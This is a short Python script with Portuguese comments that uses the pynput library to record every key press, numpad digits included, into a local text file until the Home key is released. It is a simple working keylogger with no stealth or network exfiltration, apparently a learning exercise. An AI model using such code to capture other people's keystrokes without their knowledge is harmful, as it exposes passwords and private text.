from pynput import keyboard

# Abre o arquivo no modo de escrita (o 'w' significa write)
with open('log_teclas.txt', 'a') as log:

    def on_press(key):
        # Verifica se a tecla tem um atributo 'vk' e se é um número do numpad
        if hasattr(key, 'vk') and 96 <= key.vk <= 105:
            num_numpad = key.vk - 96
            log.write(f'Numpad {num_numpad} pressionado\n')
        else:
            # Registra teclas alfanuméricas e especiais
            try:
                log.write(f'Tecla {key.char} pressionada\n')
                #print(f'Tecla {key.char} pressionada\n')
            except AttributeError:
                log.write(f'T {key} pressionada\n')
                #print(f'T especial {key} pressionada\n')

    def on_release(key):
        # Registra teclas liberadas
        #log.write(f'Tecla {key} liberada\n')teste segunda321
        #print(f'Tecla {key} liberada\n')
        
        if key == keyboard.Key.home: #tecla liberada
            # Finaliza o listener ao pressionar a tecla home
            return False

    # Configura o listener para capturar eventos de pressionar e liberar teclas
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()
#input("Pressione Enter para sair...")
